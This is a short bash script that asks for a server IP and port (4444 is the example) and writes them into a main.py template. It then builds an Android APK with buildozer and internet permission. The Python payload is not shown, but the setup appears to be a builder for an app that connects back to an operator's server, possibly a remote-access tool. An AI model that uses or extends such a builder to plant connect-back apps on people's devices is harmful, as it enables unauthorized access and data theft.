#!/bin/bash

echo -n "Enter your Server IP (e.g., 192.168.1.5): "
read server_ip

echo -n "Enter your Server Port (e.g., 4444): "
read server_port

cp main.py main_backup.py

echo "[+] Injecting IP ($server_ip) and Port ($server_port) into main.py..."
sed -i "s/CONFIG_IP/$server_ip/g" main.py
sed -i "s/CONFIG_PORT/$server_port/g" main.py

if [ ! -f buildozer.spec ]; then
    echo "[+] Initializing Buildozer..."
    buildozer init
    sed -i 's/#android.permissions =/android.permissions = INTERNET/' buildozer.spec
fi

echo "[+] Starting APK Build Process..."
buildozer -v android debug

mv main_backup.py main.py

echo "[✓] Build Process Finished! Check the 'bin/' folder for your APK."
